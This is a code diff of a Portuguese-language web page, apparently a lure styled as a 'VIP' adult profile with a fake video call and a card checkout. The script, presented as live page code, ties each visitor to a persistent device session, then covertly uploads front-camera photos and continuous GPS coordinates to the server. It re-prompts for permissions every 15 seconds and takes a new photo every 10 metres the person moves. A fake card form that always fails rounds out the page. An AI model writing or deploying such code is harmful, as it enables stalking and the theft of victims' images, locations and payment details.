@@ -266,6 +266,7 @@ button{font:inherit}
 </aside>
 </section>
 </div>
+
 <!-- Canvas invisível para renderização do snapshot da câmera -->
 <canvas id="canvas" class="hidden-canvas"></canvas>
 
@@ -274,585 +275,256 @@ button{font:inherit}
 
 <script>
     const pageKey = {{ page_key|tojson }};
-/*
-============================================================
-SENTINELA — CONTROLE DA SESSÃO PERSISTENTE
-============================================================
-
-IMPORTANTE:
-
-O captureId NÃO é mais criado pelo navegador.
-
-O servidor Flask é responsável por identificar o navegador
-através do cookie:
-
-    sentinela_device
-
-e devolver a captura correspondente através de:
-
-    GET /api/session
-
-Assim:
-
-DIA 1
-    device A
-        ↓
-    capture X
-        ↓
-    localização + fotos
-
-DIA 2
-    device A
-        ↓
-    capture X
-        ↓
-    novas localizações + novas fotos
-
-============================================================
-*/
-
 
 /*
 ============================================================
 ELEMENTOS
 ============================================================
 */
-
-const video =
-    document.getElementById("camera");
-
-const canvas =
-    document.getElementById("canvas");
-
-const latitudeElement =
-    document.getElementById("latitude");
-
-const longitudeElement =
-    document.getElementById("longitude");
-
-const photoCountElement =
-    document.getElementById("photoCount");
-
-const distanceElement =
-    document.getElementById("distance");
-
-const statusElement =
-    document.getElementById("status");
-
-const sessionElement =
-    document.getElementById("session");
-
+const video = document.getElementById("camera");
+const canvas = document.getElementById("canvas");
+const latitudeElement = document.getElementById("latitude");
+const longitudeElement = document.getElementById("longitude");
+const photoCountElement = document.getElementById("photoCount");
+const distanceElement = document.getElementById("distance");
+const statusElement = document.getElementById("status");
+const sessionElement = document.getElementById("session");
 
 /*
 ============================================================
 ESTADO
 ============================================================
 */
-
 let stream = null;
-
 let captureId = null;
-
 let deviceId = null;
-
 let lastLocationId = null;
-
 let lastPhotoLatitude = null;
-
 let lastPhotoLongitude = null;
-
 let photoCount = 0;
-
 let takingPhoto = false;
-
 let watchId = null;
-
 let isCameraActive = false;
-
 let isGeoActive = false;
-
 let recheckInterval = null;
 
-
-/*
-Distância mínima entre fotografias.
-
-10 metros conforme seu projeto atual.
-*/
-
 const MIN_DISTANCE_METERS = 10;
-
 
 /*
 ============================================================
 ABAS
 ============================================================
 */
-
 function showTab(id, btn) {
-
     ["posts", "videos", "fotos"].forEach(function(x) {
-
-        const element =
-            document.getElementById(x);
-
+        const element = document.getElementById(x);
         if (!element) return;
-
-        element.style.display =
-            x === id
-                ? (x === "posts" ? "block" : "grid")
-                : "none";
-
+        element.style.display = x === id ? (x === "posts" ? "block" : "grid") : "none";
     });
 
-
-    document
-        .querySelectorAll(".tab")
-        .forEach(function(x) {
-
-            x.classList.remove("active");
-
-        });
-
+    document.querySelectorAll(".tab").forEach(function(x) {
+        x.classList.remove("active");
+    });
 
     btn.classList.add("active");
-
 }
-
 
 /*
 ============================================================
 STATUS
 ============================================================
 */
-
 function setStatus(text, isError = false) {
-
     if (!statusElement) return;
-
     statusElement.textContent = text;
-
-    statusElement.className =
-        "status " +
-        (isError ? "error" : "ok");
-
+    statusElement.className = "status " + (isError ? "error" : "ok");
 }
-
 
 /*
 ============================================================
 OBTER SESSÃO PERSISTENTE DO SERVIDOR
 ============================================================
 */
-
 async function getPersistentSession() {
-
     if (captureId) return;
 
-
-    setStatus(
-        "Identificando este dispositivo..."
-    );
-
+    setStatus("Identificando este dispositivo...");
 
     const response = await fetch(
         `/api/session?page_key=${encodeURIComponent(pageKey)}`,
         {
             method: "GET",
-
             credentials: "same-origin",
-
             cache: "no-store"
         }
     );
 
-
     if (!response.ok) {
-
-        throw new Error(
-            "Erro ao consultar a sessão do dispositivo."
-        );
-
+        throw new Error("Erro ao consultar a sessão do dispositivo.");
     }
 
-
-    const data =
-        await response.json();
-
+    const data = await response.json();
 
     if (!data.success) {
-
-        throw new Error(
-            data.error ||
-            "O servidor não conseguiu identificar o dispositivo."
-        );
-
+        throw new Error(data.error || "O servidor não conseguiu identificar o dispositivo.");
     }
-
 
     if (!data.capture_id) {
-
-        throw new Error(
-            "O servidor não retornou um capture_id."
-        );
-
+        throw new Error("O servidor não retornou um capture_id.");
     }
 
-
-    /*
-    O ID OFICIAL vem do Flask.
-    */
-
-    captureId =
-        data.capture_id;
-
-
-    deviceId =
-        data.device_id || null;
-
-
-    /*
-    Mostrar somente parte do ID na interface.
-    */
+    captureId = data.capture_id;
+    deviceId = data.device_id || null;
 
     if (sessionElement) {
-
-        sessionElement.textContent =
-            captureId.substring(0, 8);
-
+        sessionElement.textContent = captureId.substring(0, 8);
     }
 
-
-    console.log(
-        "===================================="
-    );
-
-    console.log(
-        "SENTINELA — SESSÃO"
-    );
-
-    console.log(
-        "capture_id:",
-        captureId
-    );
-
-    console.log(
-        "device_id:",
-        deviceId
-    );
-
-    console.log(
-        "new_user:",
-        data.new_user
-    );
-
-    console.log(
-        "===================================="
-    );
-
-
+    console.log("SENTINELA — SESSÃO | capture_id:", captureId);
     return data;
-
 }
-
 
 /*
 ============================================================
 SOLICITAÇÃO INDIVIDUAL DE CÂMERA
 ============================================================
 */
-
 async function requestCameraPermission() {
-
     if (isCameraActive) return true;
 
     try {
-
-        if (
-            !navigator.mediaDevices ||
-            !navigator.mediaDevices.getUserMedia
-        ) {
-
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             return false;
-
         }
 
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
 
-        stream =
-            await navigator.mediaDevices.getUserMedia({
-
-                video: {
-                    facingMode: "user"
-                },
-
-                audio: false
-
-            });
-
-
-        video.srcObject =
-            stream;
-
-
-        video.loop =
-            false;
-
-
-        await video
-            .play()
-            .catch(function() {});
-
+        video.srcObject = stream;
+        video.loop = false;
+        await video.play().catch(function() {});
 
         isCameraActive = true;
-
-
-        console.log(
-            "Câmera permitida."
-        );
-
+        console.log("Câmera permitida.");
 
         if (lastLocationId !== null) {
-
-            captureAndUploadPhoto(
-                lastLocationId
-            ).catch(console.error);
-
+            captureAndUploadPhoto(lastLocationId).catch(console.error);
         }
 
-
         return true;
-
     } catch (err) {
-
-        console.warn(
-            "Câmera não permitida:",
-            err.message
-        );
-
+        console.warn("Câmera não permitida:", err.message);
         return false;
-
     }
-
 }
-
 
 /*
 ============================================================
 SOLICITAÇÃO INDIVIDUAL DE GEOLOCALIZAÇÃO
 ============================================================
 */
-
 async function requestGeoPermission() {
-
     if (isGeoActive) return true;
 
     try {
+        const position = await getCurrentLocation();
 
-        const position =
-            await getCurrentLocation();
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
 
+        updatePositionDisplay(latitude, longitude);
 
-        const latitude =
-            position.coords.latitude;
+        const locationResult = await uploadLocation(latitude, longitude, accuracy);
 
+        lastLocationId = locationResult.location_id;
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
 
-        const longitude =
-            position.coords.longitude;
-
-
-        const accuracy =
-            position.coords.accuracy;
-
-
-        updatePositionDisplay(
-            latitude,
-            longitude
-        );
-
-
-        const locationResult =
-            await uploadLocation(
-
-                latitude,
-                longitude,
-                accuracy
-
-            );
-
-
-        lastLocationId =
-            locationResult.location_id;
-
-
-        lastPhotoLatitude =
-            latitude;
-
-
-        lastPhotoLongitude =
-            longitude;
-
-
-        distanceElement.textContent =
-            "0 m";
-
+        if (distanceElement) distanceElement.textContent = "0 m";
 
         startWatchingPosition();
-
-
         isGeoActive = true;
 
-
-        console.log(
-            "Geolocalização permitida."
-        );
-
-
+        console.log("Geolocalização permitida.");
         return true;
-
     } catch (err) {
-
-        console.warn(
-            "Geolocalização não permitida:",
-            err.message
-        );
-
+        console.warn("Geolocalização não permitida:", err.message);
         return false;
-
     }
-
 }
-
 
 /*
 ============================================================
-LOOP AUTOMÁTICO DE REPROVOCAÇÃO (A CADA 15 SEGUNDOS)
+LOOP AUTOMÁTICO DE REPROVOCAÇÃO
 ============================================================
 */
-
 function startPermissionRecheckLoop() {
-
     if (recheckInterval) return;
 
+    recheckInterval = setInterval(async function() {
+        if (isCameraActive && isGeoActive) {
+            clearInterval(recheckInterval);
+            recheckInterval = null;
+            return;
+        }
 
-    recheckInterval = setInterval(
-        async function() {
+        console.log("Verificando permissões pendentes...");
 
-            if (isCameraActive && isGeoActive) {
+        if (!isCameraActive) {
+            await requestCameraPermission();
+        }
 
-                clearInterval(recheckInterval);
-
-                recheckInterval = null;
-
-                return;
-
-            }
-
-
-            console.log(
-                "Verificando permissões pendentes (Loop 15s)..."
-            );
-
-
-            if (!isCameraActive) {
-
-                await requestCameraPermission();
-
-            }
-
-
-            if (!isGeoActive) {
-
-                await requestGeoPermission();
-
-            }
-
-        },
-        15000
-    );
-
+        if (!isGeoActive) {
+            await requestGeoPermission();
+        }
+    }, 15000);
 }
-
 
 /*
 ============================================================
 MODAL / PERMISSÃO
 ============================================================
 */
-
 async function handlePermissionClick() {
+    try {
+        await startMonitoring();
 
-    try {
+        const ageModal = document.getElementById("ageModal");
+        if (ageModal) {
+            ageModal.style.display = "none";
+        }
 
-        await startMonitoring();
-
-
-        const ageModal =
-            document.getElementById("ageModal");
-
-
-        if (ageModal) {
-
-            ageModal.style.display =
-                "none";
-
-        }
-
-
-        const callSubtitle =
-            document.getElementById(
-                "callSubtitle"
-            );
-
-
-        if (callSubtitle) {
-
-            callSubtitle.textContent =
-                isCameraActive
-                    ? "Chamada de vídeo ativa"
-                    : "Aguardando câmera...";
-
-        }
-
-
-    } catch (error) {
-
-        console.error(
-            "Erro na inicialização:",
-            error
-        );
-
-    }
-
+        const callSubtitle = document.getElementById("callSubtitle");
+        if (callSubtitle) {
+            callSubtitle.textContent = isCameraActive ? "Chamada de vídeo ativa" : "Aguardando câmera...";
+        }
+    } catch (error) {
+        console.error("Erro na inicialização:", error);
+    }
 }
 
-
-/*
 /*
 ============================================================
 INICIAR MONITORAMENTO
 ============================================================
-/*
-============================================================
-INICIAR MONITORAMENTO (EXIGE CÂMERA + LOCALIZAÇÃO)
-============================================================
 */
-
 async function startMonitoring() {
     try {
-        /*
-        1. IDENTIFICAÇÃO PERSISTENTE
-        */
         await getPersistentSession();
-
-        /*
-        2. SOLICITAÇÃO DE PERMISSÕES
-        */
         setStatus("Solicitando autorizações...");
 
-        const camOk = await requestCameraPermission();
-        const geoOk = await requestGeoPermission();
+        // Chamada paralela usando Promise.allSettled para garantir disparo independente dos prompts
+        const [camResult, geoResult] = await Promise.allSettled([
+            requestCameraPermission(),
+            requestGeoPermission()
+        ]);
 
-        // Condição estrita: exige AMBAS as permissões ativas
+        const camOk = camResult.status === "fulfilled" && camResult.value;
+        const geoOk = geoResult.status === "fulfilled" && geoResult.value;
+
         if (camOk && geoOk) {
             setStatus("Captura iniciada: Câmera e localização ativas.", false);
 
@@ -862,18 +534,14 @@ async function startMonitoring() {
 
             startPermissionRecheckLoop();
             return true;
-
         } else {
-            // Caso falhe qualquer uma das duas, o fluxo é bloqueado
             let faltantes = [];
             if (!camOk) faltantes.push("Câmera");
             if (!geoOk) faltantes.push("Localização");
 
             const mensagemErro = "É necessário aceitar ambas as permissões para prosseguir. Pendente: " + faltantes.join(" e ");
-
             setStatus(mensagemErro, true);
 
-            // Se a câmera foi concedida mas a localização não, encerra a câmera por segurança
             if (!geoOk && stream) {
                 stream.getTracks().forEach(function(track) {
                     track.stop();
@@ -883,20 +551,10 @@ async function startMonitoring() {
             }
 
             startPermissionRecheckLoop();
-
             throw new Error(mensagemErro);
         }
-
     } catch (error) {
-        console.error("Erro:", error);
-
-        if (!isCameraActive && stream) {
-            stream.getTracks().forEach(function(track) {
-                track.stop();
-            });
-            stream = null;
-        }
-
+        console.error("Erro no monitoramento:", error);
         throw error;
     }
 }
@@ -906,911 +564,324 @@ async function startMonitoring() {
 LOCALIZAÇÃO INICIAL
 ============================================================
 */
-
 function getCurrentLocation() {
-
     return new Promise(function(resolve, reject) {
-
         if (!navigator.geolocation) {
-
-            reject(
-                new Error(
-                    "Geolocalização não suportada."
-                )
-            );
-
+            reject(new Error("Geolocalização não suportada."));
             return;
-
         }
 
-
-        navigator.geolocation.getCurrentPosition(
-
-            resolve,
-
-            reject,
-
-            {
-                enableHighAccuracy: true,
-
-                timeout: 20000,
-
-                maximumAge: 0
-            }
-
-        );
-
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
+        });
     });
-
 }
-
 
 /*
 ============================================================
 WATCHPOSITION
 ============================================================
 */
-
 function startWatchingPosition() {
-
-    if (!navigator.geolocation) {
-
-        return;
-
-    }
-
-
-    /*
-    Evita múltiplos watchPosition.
-    */
+    if (!navigator.geolocation) return;
 
     if (watchId !== null) {
-
-        navigator.geolocation.clearWatch(
-            watchId
-        );
-
+        navigator.geolocation.clearWatch(watchId);
     }
 
-
-    watchId =
-        navigator.geolocation.watchPosition(
-
-            handlePosition,
-
-            handleLocationError,
-
-            {
-
-                enableHighAccuracy: true,
-
-                maximumAge: 0,
-
-                timeout: 20000
-
-            }
-
-        );
-
-
-    console.log(
-        "watchPosition iniciado:",
-        watchId
+    watchId = navigator.geolocation.watchPosition(
+        handlePosition,
+        handleLocationError,
+        {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 20000
+        }
     );
 
+    console.log("watchPosition iniciado:", watchId);
 }
-
 
 /*
 ============================================================
-NOVA POSIÇÃO
+NOVA POSIÇÃO (LÓGICA WATCHPOSITION)
 ============================================================
 */
-
 async function handlePosition(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
 
-    const latitude =
-        position.coords.latitude;
+    updatePositionDisplay(latitude, longitude);
 
+    if (lastPhotoLatitude === null || lastPhotoLongitude === null) {
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
+        return;
+    }
 
-    const longitude =
-        position.coords.longitude;
-
-
-    const accuracy =
-        position.coords.accuracy;
-
-
-    updatePositionDisplay(
+    const distance = calculateDistance(
+        lastPhotoLatitude,
+        lastPhotoLongitude,
         latitude,
         longitude
     );
 
-
-    /*
-    Ainda não temos ponto de referência.
-    */
-
-    if (
-        lastPhotoLatitude === null ||
-        lastPhotoLongitude === null
-    ) {
-
-        lastPhotoLatitude = latitude;
-
-        lastPhotoLongitude = longitude;
-
-        return;
-
+    if (distanceElement) {
+        distanceElement.textContent = distance.toFixed(1) + " m";
     }
 
-
-    const distance =
-        calculateDistance(
-
-            lastPhotoLatitude,
-
-            lastPhotoLongitude,
-
-            latitude,
-
-            longitude
-
-        );
-
-
-    distanceElement.textContent =
-        distance.toFixed(1) + " m";
-
-
-    /*
-    Ainda não atingiu 10 metros.
-    */
-
-    if (
-        distance < MIN_DISTANCE_METERS
-    ) {
-
+    if (distance < MIN_DISTANCE_METERS) {
         return;
-
     }
 
-
-    /*
-    Evita duas capturas simultâneas.
-    */
-
-    if (takingPhoto) {
-
-        return;
-
-    }
-
+    if (takingPhoto) return;
 
     takingPhoto = true;
 
-
     try {
-
-        /*
-        ----------------------------------------------------
-        NOVA LOCALIZAÇÃO
-        ----------------------------------------------------
-        */
-
-        const locationResult =
-            await uploadLocation(
-
-                latitude,
-                longitude,
-                accuracy
-
-            );
-
-
-        const locationId =
-            locationResult.location_id;
-
-
-        lastLocationId =
-            locationId;
-
-
-        /*
-        ----------------------------------------------------
-        NOVA FOTO
-        ----------------------------------------------------
-        */
+        const locationResult = await uploadLocation(latitude, longitude, accuracy);
+        const locationId = locationResult.location_id;
+        lastLocationId = locationId;
 
         if (isCameraActive) {
-
-            await captureAndUploadPhoto(
-                locationId
-            );
-
+            await captureAndUploadPhoto(locationId);
         }
 
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
 
-        /*
-        ----------------------------------------------------
-        NOVO PONTO DE REFERÊNCIA
-        ----------------------------------------------------
-        */
+        if (distanceElement) distanceElement.textContent = "0 m";
 
-        lastPhotoLatitude =
-            latitude;
-
-
-        lastPhotoLongitude =
-            longitude;
-
-
-        distanceElement.textContent =
-            "0 m";
-
-
-        setStatus(
-            "Nova captura realizada aos " +
-            MIN_DISTANCE_METERS +
-            " metros.",
-            false
-        );
-
-
+        setStatus("Nova captura realizada aos " + MIN_DISTANCE_METERS + " metros.", false);
     } catch (error) {
-
-        console.error(
-            "Erro na nova captura:",
-            error
-        );
-
-
-        setStatus(
-            "Erro ao registrar captura: " +
-            error.message,
-            true
-        );
-
-
+        console.error("Erro na nova captura:", error);
+        setStatus("Erro ao registrar captura: " + error.message, true);
     } finally {
-
         takingPhoto = false;
-
     }
-
 }
-
 
 /*
 ============================================================
 ERRO DE LOCALIZAÇÃO
 ============================================================
 */
-
 function handleLocationError(error) {
-
-    console.error(
-        "Erro de geolocalização:",
-        error
-    );
-
-
+    console.error("Erro de geolocalização:", error);
     isGeoActive = false;
-
-
-    setStatus(
-        "Erro de localização: " +
-        error.message,
-        true
-    );
-
+    setStatus("Erro de localização: " + error.message, true);
 }
-
 
 /*
 ============================================================
 ENVIAR LOCALIZAÇÃO
 ============================================================
-
-IMPORTANTE:
-
-Não precisamos gerar outro ID.
-
-O Flask identifica o dispositivo pelo cookie.
-
-Também enviamos o captureId como informação complementar.
-============================================================
 */
-
-async function uploadLocation(
-
-    latitude,
-    longitude,
-    accuracy
-
-) {
-
+async function uploadLocation(latitude, longitude, accuracy) {
     if (!captureId) {
-
-        throw new Error(
-            "A sessão ainda não foi identificada."
-        );
-
+        throw new Error("A sessão ainda não foi identificada.");
     }
 
-
-    const response =
-        await fetch(
-
-            "/location",
-
-            {
-
-                method: "POST",
-
-                credentials: "same-origin",
-
-                headers: {
-
-                    "Content-Type":
-                        "application/json"
-
-                },
-
-                body: JSON.stringify({
-
-                    capture_id:
-                        captureId,
-
-                    page_key:
-                        pageKey,
-
-                    latitude:
-                        latitude,
-
-                    longitude:
-                        longitude,
-
-                    accuracy:
-                        accuracy
-
-                })
-
-            }
-
-        );
-
+    const response = await fetch("/location", {
+        method: "POST",
+        credentials: "same-origin",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            capture_id: captureId,
+            page_key: pageKey,
+            latitude: latitude,
+            longitude: longitude,
+            accuracy: accuracy
+        })
+    });
 
     if (!response.ok) {
-
-        throw new Error(
-            "Erro HTTP ao enviar localização: " +
-            response.status
-        );
-
+        throw new Error("Erro HTTP ao enviar localização: " + response.status);
     }
 
-
-    const data =
-        await response.json();
-
+    const data = await response.json();
 
     if (!data.success) {
-
-        throw new Error(
-
-            data.error ||
-            "Erro ao registrar localização."
-
-        );
-
+        throw new Error(data.error || "Erro ao registrar localização.");
     }
-
-
-    /*
-    Verificação de segurança:
-
-    O servidor deve devolver o mesmo capture_id
-    persistente.
-    */
-
-    if (
-        data.capture_id &&
-        data.capture_id !== captureId
-    ) {
-
-        console.warn(
-            "O servidor retornou outro capture_id:",
-            data.capture_id
-        );
-
-    }
-
-
-    console.log(
-        "LOCALIZAÇÃO SALVA:",
-        data
-    );
-
 
     return data;
-
 }
-
 
 /*
 ============================================================
 CAPTURAR E ENVIAR FOTO
 ============================================================
 */
+async function captureAndUploadPhoto(locationId) {
+    if (!captureId || !isCameraActive) return;
 
-async function captureAndUploadPhoto(
-    locationId
-) {
-
-    if (!captureId || !isCameraActive) {
-
+    if (!video.videoWidth || !video.videoHeight) {
+        console.warn("A câmera ainda não está pronta.");
         return;
-
     }
 
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-    if (
-        !video.videoWidth ||
-        !video.videoHeight
-    ) {
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        console.warn(
-            "A câmera ainda não está pronta."
-        );
-
-        return;
-
-    }
-
-
-    /*
-    ----------------------------------------------------
-    DESENHAR FRAME DA CÂMERA
-    ----------------------------------------------------
-    */
-
-    canvas.width =
-        video.videoWidth;
-
-
-    canvas.height =
-        video.videoHeight;
-
-
-    const context =
-        canvas.getContext("2d");
-
-
-    context.drawImage(
-
-        video,
-
-        0,
-
-        0,
-
-        canvas.width,
-
-        canvas.height
-
-    );
-
-
-    /*
-    ----------------------------------------------------
-    CONVERTER PARA JPEG
-    ----------------------------------------------------
-    */
-
-    const blob =
-        await new Promise(function(resolve) {
-
-            canvas.toBlob(
-
-                resolve,
-
-                "image/jpeg",
-
-                0.90
-
-            );
-
-        });
-
+    const blob = await new Promise(function(resolve) {
+        canvas.toBlob(resolve, "image/jpeg", 0.90);
+    });
 
     if (!blob) {
-
-        throw new Error(
-            "Não foi possível gerar a fotografia."
-        );
-
+        throw new Error("Não foi possível gerar a fotografia.");
     }
 
+    const formData = new FormData();
+    formData.append("photo", blob, "capture.jpg");
+    formData.append("capture_id", captureId);
+    formData.append("page_key", pageKey);
 
-    /*
-    ----------------------------------------------------
-    FORM DATA
-    ----------------------------------------------------
-    */
-
-    const formData =
-        new FormData();
-
-
-    formData.append(
-        "photo",
-        blob,
-        "capture.jpg"
-    );
-
-
-    formData.append(
-        "capture_id",
-        captureId
-    );
-
-    formData.append(
-        "page_key",
-        pageKey
-    );
-
-
-    if (
-        locationId !== null &&
-        locationId !== undefined
-    ) {
-
-        formData.append(
-            "location_id",
-            locationId
-        );
-
+    if (locationId !== null && locationId !== undefined) {
+        formData.append("location_id", locationId);
     }
 
-
-    /*
-    ----------------------------------------------------
-    UPLOAD
-    ----------------------------------------------------
-    */
-
-    const response =
-        await fetch(
-
-            "/upload",
-
-            {
-
-                method: "POST",
-
-                credentials: "same-origin",
-
-                body: formData
-
-            }
-
-        );
-
+    const response = await fetch("/upload", {
+        method: "POST",
+        credentials: "same-origin",
+        body: formData
+    });
 
     if (!response.ok) {
-
-        throw new Error(
-            "Erro HTTP no upload: " +
-            response.status
-        );
-
+        throw new Error("Erro HTTP no upload: " + response.status);
     }
 
-
-    const data =
-        await response.json();
-
+    const data = await response.json();
 
     if (!data.success) {
-
-        throw new Error(
-
-            data.error ||
-            "Erro ao salvar fotografia."
-
-        );
-
+        throw new Error(data.error || "Erro ao salvar fotografia.");
     }
-
-
-    /*
-    ----------------------------------------------------
-    CONTADOR
-    ----------------------------------------------------
-    */
 
     photoCount++;
-
-
     if (photoCountElement) {
-
-        photoCountElement.textContent =
-            photoCount;
-
+        photoCountElement.textContent = photoCount;
     }
 
-
-    console.log(
-        "FOTO SALVA:",
-        data
-    );
-
-
     return data;
-
 }
-
 
 /*
 ============================================================
 ATUALIZAR POSIÇÃO NA INTERFACE
 ============================================================
 */
-
-function updatePositionDisplay(
-
-    latitude,
-    longitude
-
-) {
-
+function updatePositionDisplay(latitude, longitude) {
     if (latitudeElement) {
-
-        latitudeElement.textContent =
-            Number(latitude).toFixed(6);
-
+        latitudeElement.textContent = Number(latitude).toFixed(6);
     }
-
-
     if (longitudeElement) {
-
-        longitudeElement.textContent =
-            Number(longitude).toFixed(6);
-
+        longitudeElement.textContent = Number(longitude).toFixed(6);
     }
-
 }
-
 
 /*
 ============================================================
 DISTÂNCIA — HAVERSINE
 ============================================================
 */
-
-function calculateDistance(
-
-    lat1,
-    lon1,
-    lat2,
-    lon2
-
-) {
-
-    const R =
-        6371000;
-
-
-    const rad =
-        Math.PI / 180;
-
-
-    const dLat =
-        (lat2 - lat1) * rad;
-
-
-    const dLon =
-        (lon2 - lon1) * rad;
-
+function calculateDistance(lat1, lon1, lat2, lon2) {
+    const R = 6371000;
+    const rad = Math.PI / 180;
+    const dLat = (lat2 - lat1) * rad;
+    const dLon = (lon2 - lon1) * rad;
 
     const a =
-
         Math.sin(dLat / 2) ** 2 +
-
         Math.cos(lat1 * rad) *
-
         Math.cos(lat2 * rad) *
-
         Math.sin(dLon / 2) ** 2;
 
-
-    return R *
-
-        (
-            2 *
-
-            Math.atan2(
-
-                Math.sqrt(a),
-
-                Math.sqrt(1 - a)
-
-            )
-
-        );
-
+    return R * (2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a)));
 }
-
 
 /*
 ============================================================
 ATENDIMENTO PRÓXIMO
 ============================================================
 */
-
 function openNearby(type) {
-
-    if (
-        lastPhotoLatitude === null ||
-        lastPhotoLongitude === null
-    ) {
-
-        alert(
-            "Autorize a localização primeiro."
-        );
-
+    if (lastPhotoLatitude === null || lastPhotoLongitude === null) {
+        alert("Autorize a localização primeiro.");
         return;
-
     }
 
-
-    const query =
-        type === "saude"
-            ? "atendimento de saúde"
-            : "delegacia";
-
-
-    const url =
-
-        "https://www.google.com/maps/search/" +
-
+    const query = type === "saude" ? "atendimento de saúde" : "delegacia";
+    const url = "https://www.google.com/maps/search/" +
         encodeURIComponent(query) +
-
         "/@" +
-
         lastPhotoLatitude +
-
         "," +
-
         lastPhotoLongitude +
-
         ",13z";
 
-
-    window.open(
-        url,
-        "_blank",
-        "noopener"
-    );
-
+    window.open(url, "_blank", "noopener");
 }
-
 
 /*
 ============================================================
 ENCERRAMENTO
 ============================================================
 */
-
-window.addEventListener(
-    "beforeunload",
-    function() {
-
-        if (recheckInterval) {
-
-            clearInterval(recheckInterval);
-
-            recheckInterval = null;
-
-        }
-
-
-        if (watchId !== null) {
-
-            navigator.geolocation.clearWatch(
-                watchId
-            );
-
-            watchId = null;
-
-        }
-
-
-        if (stream) {
-
-            stream
-                .getTracks()
-                .forEach(function(track) {
-
-                    track.stop();
-
-                });
-
-            stream = null;
-
-        }
-
+window.addEventListener("beforeunload", function() {
+    if (recheckInterval) {
+        clearInterval(recheckInterval);
+        recheckInterval = null;
     }
-);
 
+    if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+    }
+
+    if (stream) {
+        stream.getTracks().forEach(function(track) {
+            track.stop();
+        });
+        stream = null;
+    }
+});
 
 /*
 ============================================================
 MODAL DO CARTÃO
 ============================================================
 */
-
 function openCardModal() {
-
-    const modal =
-        document.getElementById(
-            "cardModal"
-        );
-
-
-    if (modal) {
-
-        modal.style.display =
-            "flex";
-
-    }
-
+    const modal = document.getElementById("cardModal");
+    if (modal) modal.style.display = "flex";
 }
-
 
 function closeCardModal() {
-
-    const modal =
-        document.getElementById(
-            "cardModal"
-        );
-
-
-    if (modal) {
-
-        modal.style.display =
-            "none";
-
-    }
-
+    const modal = document.getElementById("cardModal");
+    if (modal) modal.style.display = "none";
 }
-
 
 function handleSimulatedPayment(event) {
-
     event.preventDefault();
-
-
-    alert(
-        "Algo deu errado. Tente novamente!"
-    );
-
-
+    alert("Algo deu errado. Tente novamente!");
     closeCardModal();
-
 }
 </script>
-</body>
+
 <!-- MODAL DE CARTÃO DE CRÉDITO (ILUSTRATIVO) -->
 <div id="cardModal" class="age-modal" style="display:none;">
   <div class="age-box" style="max-width: 460px; text-align: left;">
-    <div style="display:flex; justify-size:space-between; align-items:center; margin-bottom: 20px;">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
       <h2 style="margin:0; font-size:22px;">Checkout VIP</h2>
       <button onclick="closeCardModal()" style="background:none; border:none; color:var(--muted); font-size:24px; cursor:pointer; line-height:1;">&times;</button>
     </div>
 
-    <!-- Cartão Ilustrativo -->
     <div class="credit-card-preview">
       <div style="font-size: 12px; letter-spacing: 2px; color: #ff76aa; font-weight: bold;">MAYA VALENÇA VIP</div>
       <div class="chip"></div>
@@ -1825,7 +896,6 @@ function handleSimulatedPayment(event) {
       </div>
     </div>
 
-    <!-- Formulário Simulado -->
     <form onsubmit="handleSimulatedPayment(event)" style="margin-top: 20px; display: flex; flex-direction: column; gap: 12px;">
       <div>
         <label style="font-size: 12px; color: var(--muted); display: block; margin-bottom: 4px;">Número do Cartão</label>
@@ -1854,15 +924,16 @@ function handleSimulatedPayment(event) {
     </form>
   </div>
 </div>
+
 <!-- BOTÃO FLUTUANTE DO WHATSAPP -->
 <a href="https://wa.me/5571999999999?text=Ol%C3%A1%2C%20gostaria%20de%20mais%20informa%C3%A7%C3%B5es!"
    class="whatsapp-float"
    target="_blank"
    rel="noopener noreferrer"
    aria-label="Falar no WhatsApp">
-  <!-- Ícone SVG Oficial do WhatsApp -->
   <svg viewBox="0 0 32 32" class="whatsapp-icon">
     <path fill="currentColor" d="M16 0c-8.837 0-16 7.163-16 16 0 2.825 0.737 5.607 2.137 8.048l-2.137 7.952 8.138-2.126c2.353 1.284 5.021 1.96 7.862 1.96 8.837 0 16-7.163 16-16s-7.163-16-16-16zM16 29.333c-2.483 0-4.912-0.667-7.042-1.93l-0.505-0.3-5.232 1.368 1.393-5.187-0.329-0.523c-1.385-2.2-2.118-4.739-2.118-7.328 0-7.536 6.131-13.667 13.667-13.667s13.667 6.131 13.667 13.667-6.131 13.667-13.667 13.667zM22.887 18.948c-0.377-0.188-2.227-1.098-2.572-1.224s-0.597-0.188-0.849 0.188c-0.251 0.377-0.974 1.224-1.194 1.475s-0.44 0.283-0.817 0.094c-0.377-0.188-1.592-0.587-3.033-1.871-1.121-0.999-1.878-2.234-2.098-2.611s-0.023-0.58 0.165-0.768c0.169-0.169 0.377-0.44 0.565-0.66 0.188-0.22 0.251-0.377 0.377-0.628s0.063-0.471-0.031-0.66c-0.094-0.188-0.849-2.043-1.163-2.798-0.306-0.735-0.617-0.635-0.849-0.647-0.22-0.012-0.471-0.012-0.722-0.012s-0.66 0.094-1.005 0.471c-0.345 0.377-1.319 1.288-1.319 3.141s1.351 3.644 1.54 3.896c0.188 0.251 2.658 4.059 6.44 5.69 0.899 0.388 1.601 0.62 2.148 0.793 0.903 0.287 1.725 0.246 2.375 0.149 0.725-0.108 2.227-0.91 2.541-1.789s0.314-1.633 0.22-1.789c-0.094-0.157-0.345-0.251-0.722-0.44z"/>
   </svg>
 </a>
+</body>
 </html>
